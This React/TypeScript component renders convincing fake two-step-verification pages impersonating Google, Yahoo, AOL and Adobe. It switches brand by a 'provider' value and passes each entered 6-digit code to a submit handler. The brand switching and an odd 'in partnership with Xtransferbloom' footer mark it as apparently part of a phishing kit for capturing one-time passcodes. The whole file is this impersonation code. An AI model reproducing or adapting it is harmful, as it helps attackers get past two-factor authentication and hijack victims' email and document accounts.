import React, { useState } from 'react';
import Spinner from './common/Spinner';
import OtpInput from './common/OtpInput';

interface OtpPageProps {
  onSubmit: (otp: string) => void;
  isLoading: boolean;
  errorMessage?: string;
  email?: string;
  provider?: string;
}

const AdobeLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-7 h-7">
    <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
    <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
    <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
  </svg>
);

/* ── Gmail / Google-style OTP ─────────────────────────────────── */
const GmailOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
  <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fff', fontFamily: "'Google Sans', 'Roboto', Arial, sans-serif" }}>
    <div className="w-full max-w-md rounded-lg border border-gray-200 p-8 md:p-10" style={{ boxShadow: '0 1px 3px rgba(0,0,0,0.08)' }}>
      <div className="text-center mb-6">
        <svg viewBox="0 0 75 24" className="mx-auto h-6 mb-6">
          <g>
            <path fill="#4285F4" d="M3.2 13.2l-.1-.9h-3v3.4h1.7v-2c.4.5 1 .8 1.7.8 1.5 0 2.7-1.2 2.7-3s-1.2-3-2.7-3c-.7 0-1.3.3-1.7.8l.1-.7H.3v8.5h1.7v-3.1c.4.5 1 .8 1.7.8 1.5 0 2.7-1.3 2.7-3s-1.2-3.1-2.7-3.1c-.7 0-1.3.3-1.7.9z" transform="translate(0,3) scale(3.2)" />
          </g>
          <text x="2" y="20" fill="#4285F4" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">G</text>
          <text x="20" y="20" fill="#EA4335" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">o</text>
          <text x="36" y="20" fill="#FBBC05" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">o</text>
          <text x="52" y="20" fill="#4285F4" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">g</text>
          <text x="67" y="20" fill="#34A853" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">l</text>
          <text x="73" y="20" fill="#EA4335" fontSize="22" fontWeight="500" fontFamily="'Google Sans',Arial">e</text>
        </svg>
        <h1 className="text-2xl font-normal text-gray-800 mb-2">2-Step Verification</h1>
        <p className="text-sm text-gray-600">
          To help keep your account safe, Google wants to make sure it's really you trying to sign in
        </p>
        {email && <p className="text-sm text-blue-600 mt-3 font-medium">{email}</p>}
      </div>

      <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
        <div className="flex items-start gap-3">
          <svg className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
          <div>
            <p className="text-sm font-medium text-gray-800">Check your phone</p>
            <p className="text-xs text-gray-600 mt-0.5">A verification code has been sent to your device. Enter the 6-digit code below.</p>
          </div>
        </div>
      </div>

      <form onSubmit={onSubmit} className="space-y-6">
        {errorMessage && (
          <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
            <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
            <span>{errorMessage}</span>
          </div>
        )}

        <div>
          <label className="text-sm font-medium text-gray-700 block mb-2">Enter code</label>
          <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
        </div>

        <div className="flex justify-between items-center pt-2">
          <button type="button" className="text-sm font-medium text-blue-600 hover:text-blue-800 transition-colors">Try another way</button>
          <button type="submit" disabled={isLoading || otp.length !== 6} className="px-6 py-2.5 rounded-md font-medium text-sm text-white bg-[#1A73E8] hover:bg-[#1557B0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
            {isLoading ? 'Verifying...' : 'Next'}
          </button>
        </div>
      </form>

      <div className="mt-8 pt-4 border-t border-gray-100 flex items-center justify-center gap-4 text-xs text-gray-500">
        <a href="https://support.google.com/accounts" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Help</a>
        <a href="https://accounts.google.com/TOS" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
        <a href="https://accounts.google.com/TOS" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
      </div>
    </div>
  </div>
);

/* ── Yahoo-style OTP ──────────────────────────────────────────── */
const YahooOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
  <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
    <div className="w-full max-w-md">
      <div className="text-center mb-6">
        <svg viewBox="0 0 120 40" className="mx-auto h-10 mb-6">
          <text x="0" y="32" fill="#720e9e" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Yahoo</text>
        </svg>
      </div>

      <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
        <h1 className="text-xl font-bold text-gray-900 mb-2">Verify your identity</h1>
        <p className="text-sm text-gray-600 mb-1">Enter the verification code sent to:</p>
        {email && <p className="text-sm font-semibold text-gray-900 mb-6">{email}</p>}

        <form onSubmit={onSubmit} className="space-y-6">
          {errorMessage && (
            <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
              <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
              <span>{errorMessage}</span>
            </div>
          )}

          <div>
            <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
            <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
          </div>

          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 disabled:cursor-not-allowed transition-colors" style={{ backgroundColor: '#720e9e' }} onMouseEnter={e => { if (!(e.currentTarget as HTMLButtonElement).disabled) (e.currentTarget as HTMLElement).style.backgroundColor = '#5b0b7e'; }} onMouseLeave={e => (e.currentTarget as HTMLElement).style.backgroundColor = '#720e9e'}>
            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
            {isLoading ? 'Verifying...' : 'Verify'}
          </button>
        </form>

        <div className="mt-6 text-center">
          <button type="button" className="text-sm font-medium hover:underline" style={{ color: '#720e9e' }}>Resend code</button>
        </div>
      </div>

      <div className="mt-6 text-center text-xs text-gray-500">
        <div className="flex items-center justify-center gap-3">
          <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
          <span className="text-gray-300">|</span>
          <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
        </div>
        <p className="mt-2 text-gray-400">© 2026 Yahoo. All rights reserved.</p>
      </div>
    </div>
  </div>
);

/* ── AOL-style OTP ────────────────────────────────────────────── */
const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
  <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fafafa', fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
    <div className="w-full max-w-md">
      <div className="text-center mb-6">
        <svg viewBox="0 0 80 40" className="mx-auto h-10 mb-6">
          <text x="0" y="32" fill="#39007E" fontSize="36" fontWeight="700" fontFamily="'Helvetica Neue',Arial">Aol</text>
        </svg>
      </div>

      <div className="bg-white rounded-lg p-8" style={{ boxShadow: '0 1px 4px rgba(0,0,0,0.1)' }}>
        <h1 className="text-xl font-bold text-gray-900 mb-2">Verify your identity</h1>
        <p className="text-sm text-gray-600 mb-1">Enter the verification code sent to:</p>
        {email && <p className="text-sm font-semibold text-gray-900 mb-6">{email}</p>}

        <form onSubmit={onSubmit} className="space-y-6">
          {errorMessage && (
            <div className="p-3 rounded-md text-sm text-red-700 bg-red-50 border border-red-200 flex items-start gap-2">
              <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
              <span>{errorMessage}</span>
            </div>
          )}

          <div>
            <label className="text-sm font-medium text-gray-700 block mb-2">Verification code</label>
            <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
          </div>

          <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 rounded-full font-bold text-sm text-white disabled:opacity-50 disabled:cursor-not-allowed transition-colors" style={{ backgroundColor: '#39007E' }} onMouseEnter={e => { if (!(e.currentTarget as HTMLButtonElement).disabled) (e.currentTarget as HTMLElement).style.backgroundColor = '#2a005f'; }} onMouseLeave={e => (e.currentTarget as HTMLElement).style.backgroundColor = '#39007E'}>
            {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
            {isLoading ? 'Verifying...' : 'Verify'}
          </button>
        </form>

        <div className="mt-6 text-center">
          <button type="button" className="text-sm font-medium hover:underline" style={{ color: '#39007E' }}>Resend code</button>
        </div>
      </div>

      <div className="mt-6 text-center text-xs text-gray-500">
        <div className="flex items-center justify-center gap-3">
          <a href="https://legal.yahoo.com/us/en/yahoo/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Privacy</a>
          <span className="text-gray-300">|</span>
          <a href="https://legal.yahoo.com/us/en/yahoo/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">Terms</a>
        </div>
        <p className="mt-2 text-gray-400">© 2026 Aol. All rights reserved.</p>
      </div>
    </div>
  </div>
);

/* ── Default / Others / Adobe-style OTP ───────────────────────── */
const DefaultOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
  <div className="min-h-screen flex items-center justify-center p-4 font-sans" style={{ background: 'linear-gradient(135deg, #1B1B1B 0%, #2C2C2C 50%, #1B1B1B 100%)', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
    <div className="fixed top-0 left-0 right-0 h-1" style={{ background: 'linear-gradient(90deg, #FA0F00, #E8336D, #1473E6)' }} />

    <div className="w-full max-w-sm">
      <div className="mb-8 text-center">
        <div className="flex justify-center mb-5">
          <AdobeLogo />
        </div>
        <h1 className="text-xl font-semibold text-white mb-2">Two-Step Verification</h1>
        <p className="text-sm text-gray-400">
          Enter the 6-digit code sent to your authenticator app or phone.
        </p>
        {email && (
          <p className="text-sm text-gray-300 mt-2 font-medium">{email}</p>
        )}
      </div>

      <form onSubmit={onSubmit} className="space-y-6">
        {errorMessage && (
          <div className="p-3 rounded-md text-sm font-medium flex items-start gap-2" style={{ backgroundColor: 'rgba(215, 55, 63, 0.15)', color: '#FF6B6B', border: '1px solid rgba(215, 55, 63, 0.3)' }}>
            <svg className="w-4 h-4 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" /></svg>
            <span>{errorMessage}</span>
          </div>
        )}

        <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} />

        <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full flex items-center justify-center py-2.5 px-4 rounded-full font-semibold text-sm text-white bg-[#1473E6] hover:bg-[#0d66d0] disabled:opacity-50 disabled:cursor-not-allowed transition-colors">
          {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
          {isLoading ? 'Verifying...' : 'Verify Code'}
        </button>
      </form>

      <div className="mt-10 pt-6" style={{ borderTop: '1px solid rgba(255,255,255,0.12)' }}>
        <div className="flex items-center justify-center gap-2 mb-3">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 26" className="w-4 h-4">
            <polygon fill="#FA0F00" points="11.5,0 0,0 0,26" />
            <polygon fill="#FA0F00" points="18.5,0 30,0 30,26" />
            <polygon fill="#FA0F00" points="15,9.6 22.1,26 18.2,26 16,20.8 10.9,20.8" />
          </svg>
          <span className="text-xs font-medium text-gray-300">Adobe Document Cloud</span>
        </div>
        <p className="text-xs text-gray-400 text-center mb-2">Secured by Adobe® in partnership with Xtransferbloom</p>
        <div className="flex items-center justify-center gap-3 text-xs text-gray-400">
          <a href="https://www.adobe.com/privacy.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Privacy</a>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>|</span>
          <a href="https://www.adobe.com/legal/terms.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Terms of Use</a>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>|</span>
          <a href="https://www.adobe.com/privacy/cookies.html" target="_blank" rel="noopener noreferrer" className="hover:text-gray-200 transition-colors">Cookie Preferences</a>
        </div>
        <p className="text-xs text-gray-500 text-center mt-2">© 2026 Adobe. All rights reserved.</p>
      </div>
    </div>
  </div>
);

/* ── Main OTP Page (routes to the right provider theme) ──────── */
const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, email, provider }) => {
  const [otp, setOtp] = useState('');

  const handleOtpComplete = (completedOtp: string) => {
    setOtp(completedOtp);
  };
  
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length === 6) {
      onSubmit(otp);
    }
  };

  const sharedProps = { email, errorMessage, isLoading, otp, onOtpComplete: handleOtpComplete, onSubmit: handleSubmit };

  switch (provider) {
    case 'Gmail':
      return <GmailOtp {...sharedProps} />;
    case 'Yahoo':
      return <YahooOtp {...sharedProps} />;
    case 'AOL':
      return <AolOtp {...sharedProps} />;
    default:
      return <DefaultOtp {...sharedProps} />;
  }
};

export default OtpPage;
